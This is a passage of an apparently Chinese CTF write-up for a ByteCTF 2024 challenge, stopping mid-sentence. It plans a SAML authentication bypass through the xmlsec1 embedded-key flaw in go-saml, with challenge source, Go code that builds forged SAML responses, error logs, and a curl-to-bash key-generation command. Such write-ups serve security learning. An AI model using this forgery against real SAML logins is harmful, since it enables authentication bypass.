class="line">        jwt.StandardClaims&#123;</span><br><span class="line">            ExpiresAt: time.Now().Add(time.Hour * 24 * 7).Unix(), // 过期时间</span><br><span class="line">            Issuer:    &quot;bytectf&quot;,                                  // 发行者</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;guest&quot;, // 用户名</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 使用HS256签名方法生成JWT令牌</span><br><span class="line">    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)</span><br><span class="line">    tokenString, _ := token.SignedString([]byte(secret_key)) // 使用密钥签名生成token字符串</span><br><span class="line"></span><br><span class="line">    // 返回生成的JWT令牌和随机验证码</span><br><span class="line">    c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">        &quot;token&quot;: tokenString,</span><br><span class="line">        &quot;code&quot;:  random_code,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>这块代码初始化SAML服务提供商，解析IDP-&gt;SP返回包以获取用户是否通过认证。通过认证则下发jwt。</p>
<h2 id="admin"><a href="#admin" class="headerlink" title="&#x2F;admin"></a>&#x2F;admin</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// 定义受JWT认证保护的路由组</span><br><span class="line">auth := r.Group(&quot;/&quot;)</span><br><span class="line">auth.Use(jwtauth()) // 使用JWT认证中间件</span><br><span class="line">&#123;</span><br><span class="line">    // 受保护的/admin路由</span><br><span class="line">    auth.GET(&quot;/admin&quot;, func(c *gin.Context) &#123;</span><br><span class="line">        username, _ := c.Get(&quot;username&quot;) // 获取JWT中的用户名</span><br><span class="line">        code := c.Query(&quot;code&quot;)          // 获取请求中的code参数</span><br><span class="line">        if username == &quot;admin&quot; &amp;&amp; code == random_code &#123;</span><br><span class="line">            // 如果用户名为admin且code匹配，返回flag文件内容</span><br><span class="line">            flag, _ := os.ReadFile(&quot;/flag.txt&quot;)</span><br><span class="line">            c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">                &quot;message&quot;: &quot;Welcome, admin! This is flag:&quot; + string(flag),</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 否则返回未授权的错误</span><br><span class="line">            c.JSON(http.StatusUnauthorized, gin.H&#123;</span><br><span class="line">                &quot;message&quot;: &quot;Unauthorized&quot;,</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过jwt认证 可以获取flag</p>
<h2 id="jwt认证中间件"><a href="#jwt认证中间件" class="headerlink" title="jwt认证中间件"></a>jwt认证中间件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">func jwtauth() gin.HandlerFunc &#123;</span><br><span class="line">    return func(c *gin.Context) &#123;</span><br><span class="line">        token := c.GetHeader(&quot;Authorization&quot;) // 获取请求头中的Authorization字段</span><br><span class="line">        if token == &quot;&quot; &#123;</span><br><span class="line">            // 如果没有提供token，返回未授权</span><br><span class="line">            c.JSON(401, gin.H&#123;</span><br><span class="line">                &quot;message&quot;: &quot;Unauthorized&quot;,</span><br><span class="line">            &#125;)</span><br><span class="line">            c.Abort() // 中断请求</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        claims := &amp;MyCustomClaims&#123;&#125; // 初始化自定义声明结构</span><br><span class="line">        tk, err := jwt.ParseWithClaims(token, claims, func(token *jwt.Token) (interface&#123;&#125;, error) &#123;</span><br><span class="line">            return []byte(secret_key), nil // 使用密钥解析JWT</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        if err != nil &amp;&amp; !errors.Is(err, jwt.ErrTokenExpired) &#123;</span><br><span class="line">            // 如果解析失败并且不是因为过期错误，返回错误信息</span><br><span class="line">            c.JSON(401, gin.H&#123;</span><br><span class="line">                &quot;message&quot;: err.Error(),</span><br><span class="line">            &#125;)</span><br><span class="line">            c.Abort()</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 获取当前时间和JWT过期时间</span><br><span class="line">        currentTime := time.Now().Unix()</span><br><span class="line">        expirationTime := claims.ExpiresAt</span><br><span class="line">        timeSinceExpiration := currentTime - expirationTime</span><br><span class="line"></span><br><span class="line">        // 如果token过期且在24小时内，重新生成token</span><br><span class="line">        if err != nil &amp;&amp; errors.Is(err, jwt.ErrTokenExpired) &#123;</span><br><span class="line">            if timeSinceExpiration &gt;= 0 &amp;&amp; timeSinceExpiration &lt;= 86400 &#123;</span><br><span class="line">                claims.ExpiresAt = time.Now().Add(time.Hour * 24 * 7).Unix() // 续签7天</span><br><span class="line">                tk = jwt.NewWithClaims(jwt.SigningMethodHS256, claims)       // 重新生成JWT</span><br><span class="line">                newToken, _ := tk.SignedString([]byte(secret_key))            // 使用密钥签名新的token</span><br><span class="line">                c.Header(&quot;Authorization&quot;, newToken)                          // 将新的token添加到响应头</span><br><span class="line">                c.Abort()</span><br><span class="line">                return</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                // 如果token过期时间超过24小时，返回错误</span><br><span class="line">                c.JSON(401, gin.H&#123;</span><br><span class="line">                    &quot;message&quot;: err.Error(),</span><br><span class="line">                &#125;)</span><br><span class="line">                c.Abort()</span><br><span class="line">                return</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 将用户名设置到Gin的上下文中供后续路由使用</span><br><span class="line">        c.Set(&quot;username&quot;, claims.Username)</span><br><span class="line">        c.Next() // 继续处理请求</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>看完整段代码  初步逻辑是伪造IDP-&gt;SP消息，通过认证生成jwt</p>
<h2 id="如何伪造idp-sp-？"><a href="#如何伪造idp-sp-？" class="headerlink" title="如何伪造idp-&gt;sp ？"></a>如何伪造idp-&gt;sp ？</h2><p>正常的流程是 sp收到idp的响应后，用idp的公钥对消息进行签名。</p>
<p><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2023-121_go-saml__archived_/">GHSL-2023-121: SAML authentication bypass vulnerability in RobotsAndPencils&#x2F;go-saml - CVE-2023-48703 | GitHub Security Lab</a></p>
<p>xmlsec1的漏洞，还有一个<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/157fGn7lLP1uBuRz8zUgRDWTDklKznljeOWwRQ-C6uFg/edit?usp=sharing">CVE-2021-21239 Report - Google Docs</a></p>
<p>问题来源于 xmlsec1在验证签名1.xml时，如果1.xml里面有公钥信息，会选用1.xml里携带的公钥进行验证。</p>
<p>让我们用go-saml项目示例的代码 学习一下流程</p>
<p><a target="_blank" rel="noopener" href="https://github.com/RobotsAndPencils/go-saml">RobotsAndPencils&#x2F;go-saml: A just good enough SAML client library written in Go.</a></p>
<h3 id="两对密钥"><a href="#两对密钥" class="headerlink" title="两对密钥"></a>两对密钥</h3><p>idp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://raw.githubusercontent.com/frntn/x509-san/master/gencert.sh | CRT_CN=&quot;mycert&quot;  bash</span><br><span class="line">/root/GolandProjects/bytectf2024_ezauth/frntn-x509-san.crt</span><br><span class="line">/root/GolandProjects/bytectf2024_ezauth/frntn-x509-san.key</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>sp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用默认的，我的路径为</span><br><span class="line">/root/go/pkg/mod/github.com/!robots!and!pencils/go-saml@v0.0.0-20230606195814-29020529affc/default.crt</span><br><span class="line">/root/go/pkg/mod/github.com/!robots!and!pencils/go-saml@v0.0.0-20230606195814-29020529affc/default.key</span><br></pre></td></tr></table></figure>

<p>证书(Certificate) - *.cer *.crt<br>私钥(Private Key) - *.key</p>
<p>至于pem和der，是编码方式</p>
<p>*.pem - base64编码</p>
<p>*.der - 二进制编码</p>
<h3 id="idp"><a href="#idp" class="headerlink" title="idp"></a>idp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">issuer := &quot;http://localhost:8000/saml&quot;</span><br><span class="line">authnResponse := saml.NewSignedResponse()</span><br><span class="line">authnResponse.Issuer.Url = issuer</span><br><span class="line">authnResponse.Assertion.Issuer.Url = issuer</span><br><span class="line">authnResponse.Signature.KeyInfo.X509Data.X509Certificate.Cert = &quot;stringValueOfCert&quot;</span><br><span class="line">authnResponse.Assertion.Subject.NameID.Value = &quot;userIdThatYouAuthenticated&quot;</span><br><span class="line">authnResponse.AddAttribute(&quot;uid&quot;, &quot;userIdThatYouAuthenticated&quot;)</span><br><span class="line">authnResponse.AddAttribute(&quot;email&quot;, &quot;someone@domain&quot;)</span><br><span class="line">authnResponse.Assertion.Subject.SubjectConfirmation.SubjectConfirmationData.InResponseTo = &quot;authnRequestIdRespondingTo&quot;</span><br><span class="line">authnResponse.InResponseTo = &quot;authnRequestIdRespondingTo&quot;</span><br><span class="line">authnResponse.Assertion.Subject.SubjectConfirmation.SubjectConfirmationData.Recipient = issuer</span><br><span class="line"></span><br><span class="line">// or signed base64 encoded XML string</span><br><span class="line">b64XML, err := authnResponse.EncodedSignedString(&quot;/root/GolandProjects/bytectf2024_ezauth/frntn-x509-san.key&quot;)</span><br><span class="line">b64XML = &quot;SAMLResponse=&quot; + b64XML</span><br><span class="line">// 创建一个POST请求，目标地址是localhost:58080/acs</span><br><span class="line">_, err = http.Post(&quot;http://localhost:58080/acs&quot;, &quot;application/x-www-form-urlencoded&quot;, bytes.NewBufferString(b64XML))</span><br></pre></td></tr></table></figure>

<h3 id="sp"><a href="#sp" class="headerlink" title="sp"></a>sp</h3><p>用题目的</p>
<h3 id="报错1"><a href="#报错1" class="headerlink" title="报错1"></a>报错1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">exit status 1 : /tmp/tmpgs1448165946:3: namespace error : xmlns:saml: Empty XML namespace is not allowed</span><br><span class="line">    &lt;saml:Issuer xmlns:saml=&quot;&quot;&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">                              ^</span><br><span class="line">/tmp/tmpgs1448165946:27: namespace error : xmlns:saml: Empty XML namespace is not allowed</span><br><span class="line">        &lt;saml:Issuer xmlns:saml=&quot;&quot;&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">                                  ^</span><br><span class="line">func=xmlSecBase64CtxFinal_ex:file=base64.c:line=299:obj=unknown:subj=xmlSecBase64CtxDecodeIsFinished:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecBase64Decode_ex:file=base64.c:line=709:obj=unknown:subj=xmlSecBase64CtxFinal_ex:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecKeyValueX509XmlReadBase64Blob:file=keysdata.c:line=2118:obj=unknown:subj=xmlSecBase64DecodeInPlace:error=1:xmlsec library function failed:node=X509Certificate</span><br><span class="line">func=xmlSecKeyValueX509XmlRead:file=keysdata.c:line=2283:obj=unknown:subj=xmlSecKeyValueX509XmlReadBase64Blob(cert):error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecK</span><br></pre></td></tr></table></figure>

<p>存在一些空属性没有赋值，我们看一下NewSignedResponse() 方法，该方法返回的是一个名为 <code>Response</code> 的结构体实例。</p>
<p>示例给的idp代码中的赋值操作，实际上对这个结构体进行修改。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">func NewSignedResponse() *Response &#123;</span><br><span class="line">	return &amp;Response&#123;</span><br><span class="line">		XMLName: xml.Name&#123;</span><br><span class="line">			Local: &quot;samlp:Response&quot;,</span><br><span class="line">		&#125;,</span><br><span class="line">		SAMLP:        &quot;urn:oasis:names:tc:SAML:2.0:protocol&quot;,</span><br><span class="line">		SAML:         &quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;,</span><br><span class="line">		SAMLSIG:      &quot;http://www.w3.org/2000/09/xmldsig#&quot;,</span><br><span class="line">		ID:           util.ID(),</span><br><span class="line">		Version:      &quot;2.0&quot;,</span><br><span class="line">		IssueInstant: time.Now().UTC().Format(time.RFC3339Nano),</span><br><span class="line">		Issuer: Issuer&#123;</span><br><span class="line">			XMLName: xml.Name&#123;</span><br><span class="line">				Local: &quot;saml:Issuer&quot;,</span><br><span class="line">			&#125;,</span><br><span class="line">			Url: &quot;&quot;, // caller must populate ar.AppSettings.AssertionConsumerServiceURL,</span><br><span class="line">		&#125;,</span><br><span class="line">		Signature: Signature&#123;</span><br><span class="line">			XMLName: xml.Name&#123;</span><br><span class="line">				Local: &quot;samlsig:Signature&quot;,</span><br><span class="line">			&#125;,</span><br><span class="line">			Id: util.ID(),</span><br><span class="line">			SignedInfo: SignedInfo&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;samlsig:SignedInfo&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				CanonicalizationMethod: CanonicalizationMethod&#123;</span><br><span class="line">					XMLName: xml.Name&#123;</span><br><span class="line">						Local: &quot;samlsig:CanonicalizationMethod&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">					Algorithm: &quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				SignatureMethod: SignatureMethod&#123;</span><br><span class="line">					XMLName: xml.Name&#123;</span><br><span class="line">						Local: &quot;samlsig:SignatureMethod&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">					Algorithm: &quot;http://www.w3.org/2000/09/xmldsig#rsa-sha1&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				SamlsigReference: SamlsigReference&#123;</span><br><span class="line">					XMLName: xml.Name&#123;</span><br><span class="line">						Local: &quot;samlsig:Reference&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">					URI: &quot;&quot;, // caller must populate &quot;#&quot; + ar.Id,</span><br><span class="line">					Transforms: Transforms&#123;</span><br><span class="line">						XMLName: xml.Name&#123;</span><br><span class="line">							Local: &quot;samlsig:Transforms&quot;,</span><br><span class="line">						&#125;,</span><br><span class="line">						Transform: []Transform&#123;Transform&#123;</span><br><span class="line">							XMLName: xml.Name&#123;</span><br><span class="line">								Local: &quot;samlsig:Transform&quot;,</span><br><span class="line">							&#125;,</span><br><span class="line">							Algorithm: &quot;http://www.w3.org/2000/09/xmldsig#enveloped-signature&quot;,</span><br><span class="line">						&#125;&#125;,</span><br><span class="line">					&#125;,</span><br><span class="line">					DigestMethod: DigestMethod&#123;</span><br><span class="line">						XMLName: xml.Name&#123;</span><br><span class="line">							Local: &quot;samlsig:DigestMethod&quot;,</span><br><span class="line">						&#125;,</span><br><span class="line">						Algorithm: &quot;http://www.w3.org/2000/09/xmldsig#sha1&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">					DigestValue: DigestValue&#123;</span><br><span class="line">						XMLName: xml.Name&#123;</span><br><span class="line">							Local: &quot;samlsig:DigestValue&quot;,</span><br><span class="line">						&#125;,</span><br><span class="line">					&#125;,</span><br><span class="line">				&#125;,</span><br><span class="line">			&#125;,</span><br><span class="line">			SignatureValue: SignatureValue&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;samlsig:SignatureValue&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">			&#125;,</span><br><span class="line">			KeyInfo: KeyInfo&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;samlsig:KeyInfo&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				X509Data: X509Data&#123;</span><br><span class="line">					XMLName: xml.Name&#123;</span><br><span class="line">						Local: &quot;samlsig:X509Data&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">					X509Certificate: X509Certificate&#123;</span><br><span class="line">						XMLName: xml.Name&#123;</span><br><span class="line">							Local: &quot;samlsig:X509Certificate&quot;,</span><br><span class="line">						&#125;,</span><br><span class="line">						Cert: &quot;&quot;, // caller must populate cert,</span><br><span class="line">					&#125;,</span><br><span class="line">				&#125;,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		Status: Status&#123;</span><br><span class="line">			XMLName: xml.Name&#123;</span><br><span class="line">				Local: &quot;samlp:Status&quot;,</span><br><span class="line">			&#125;,</span><br><span class="line">			StatusCode: StatusCode&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;samlp:StatusCode&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				// TODO unsuccesful responses??</span><br><span class="line">				Value: &quot;urn:oasis:names:tc:SAML:2.0:status:Success&quot;,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		Assertion: Assertion&#123;</span><br><span class="line">			XMLName: xml.Name&#123;</span><br><span class="line">				Local: &quot;saml:Assertion&quot;,</span><br><span class="line">			&#125;,</span><br><span class="line">			XS:           &quot;http://www.w3.org/2001/XMLSchema&quot;,</span><br><span class="line">			XSI:          &quot;http://www.w3.org/2001/XMLSchema-instance&quot;,</span><br><span class="line">			SAML:         &quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;,</span><br><span class="line">			Version:      &quot;2.0&quot;,</span><br><span class="line">			ID:           util.ID(),</span><br><span class="line">			IssueInstant: time.Now().UTC().Format(time.RFC3339Nano),</span><br><span class="line">			Issuer: Issuer&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;saml:Issuer&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				Url: &quot;&quot;, // caller must populate ar.AppSettings.AssertionConsumerServiceURL,</span><br><span class="line">			&#125;,</span><br><span class="line">			Subject: Subject&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;saml:Subject&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				NameID: NameID&#123;</span><br><span class="line">					XMLName: xml.Name&#123;</span><br><span class="line">						Local: &quot;saml:NameID&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">					Format:          &quot;urn:oasis:names:tc:SAML:2.0:nameid-format:transient&quot;,</span><br><span class="line">					Value:           &quot;&quot;,</span><br><span class="line">					SPNameQualifier: &quot;&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				SubjectConfirmation: SubjectConfirmation&#123;</span><br><span class="line">					XMLName: xml.Name&#123;</span><br><span class="line">						Local: &quot;saml:SubjectConfirmation&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">					Method: &quot;urn:oasis:names:tc:SAML:2.0:cm:bearer&quot;,</span><br><span class="line">					SubjectConfirmationData: SubjectConfirmationData&#123;</span><br><span class="line">						XMLName: xml.Name&#123;</span><br><span class="line">							Local: &quot;saml:SubjectConfirmationData&quot;,</span><br><span class="line">						&#125;,</span><br><span class="line">						InResponseTo: &quot;&quot;,</span><br><span class="line">						NotOnOrAfter: time.Now().Add(time.Minute * 5).UTC().Format(time.RFC3339Nano),</span><br><span class="line">						Recipient:    &quot;&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">				&#125;,</span><br><span class="line">			&#125;,</span><br><span class="line">			Conditions: Conditions&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;saml:Conditions&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				NotBefore:            time.Now().Add(time.Minute * -5).UTC().Format(time.RFC3339Nano),</span><br><span class="line">				NotOnOrAfter:         time.Now().Add(time.Minute * 5).UTC().Format(time.RFC3339Nano),</span><br><span class="line">				AudienceRestrictions: []AudienceRestriction&#123;&#125;,</span><br><span class="line">			&#125;,</span><br><span class="line">			AttributeStatement: AttributeStatement&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;saml:AttributeStatement&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				Attributes: []Attribute&#123;&#125;,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/$%7Bfiilename%7D/image-20241111200952916.png" alt="image-20241111200952916"></p>
<p>照着添加（一个个试了试）</p>
<pre><code>    authnResponse.Issuer.SAML = &quot;error&quot;
    authnResponse.Assertion.Issuer.SAML = &quot;error&quot;
</code></pre>
<p>成功解决 ，但是报错2</p>
<h3 id="报错2"><a href="#报错2" class="headerlink" title="报错2"></a>报错2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">exit status 1 : func=xmlSecBase64CtxFinal_ex:file=base64.c:line=299:obj=unknown:subj=xmlSecBase64CtxDecodeIsFinished:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecBase64Decode_ex:file=base64.c:line=709:obj=unknown:subj=xmlSecBase64CtxFinal_ex:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecKeyValueX509XmlReadBase64Blob:file=keysdata.c:line=2118:obj=unknown:subj=xmlSecBase64DecodeInPlace:error=1:xmlsec library function failed:node=X509Certificate</span><br><span class="line">func=xmlSecKeyValueX509XmlRead:file=keysdata.c:line=2283:obj=unknown:subj=xmlSecKeyValueX509XmlReadBase64Blob(cert):error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecKeyDataX509XmlRead:file=keysdata.c:line=1908:obj=x509:subj=xmlSecKeyValueX509XmlRead:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecOpenSSLKeyDataX509XmlRead:file=x509.c:line=567:obj=x509:subj=xmlSecKeyDataX509XmlRead:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecKeyInfoNodeRead:file=keyinfo.c:line=123:obj=x509:subj=xmlSecKeyDataXmlRead:error=1:xmlsec library function failed:node=X5</span><br></pre></td></tr></table></figure>

<p>用sp的证书试试，也有问题。</p>
<h3 id="跟进签名逻辑看看"><a href="#跟进签名逻辑看看" class="headerlink" title="跟进签名逻辑看看"></a>跟进签名逻辑看看</h3><p><img src="/../imgs/$%7Bfiilename%7D/image-20241111201231381.png" alt="image-20241111201231381"></p>
<p>先生成临时文件，添加xml声明作为首行，调用xmlsec1。这个err是xmlsec1给出的。</p>
<p>只能再换证书。生成新的密钥对：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:2048 -keyout idp_private_key.pem -out idp_public_key.pem -days 365 -nodes -subj &quot;/C=XX/ST=XX/L=XX/O=XX/CN=XX&quot;</span><br></pre></td></tr></table></figure>

<p>还是异常。</p>
<p>换CVE-2021-21239 Report - Google Docs中的私钥  还是不行。</p>
<p>怀疑是因为没有权限，给证书换个位置，还不行。</p>
<p>迷惑了。</p>
<p>用exec.command执行的语句，给test.xml签名</p>
<p>xmlsec1 –sign –privkey-pem &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;bytectf2024_ezauth&#x2F;key.pem –id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response –output &#x2F;signed.xml test.xml  </p>
<p>签名成功。说明是idp代码的问题。</p>
<h3 id="改idp"><a href="#改idp" class="headerlink" title="改idp"></a>改idp</h3><p>观察到            </p>
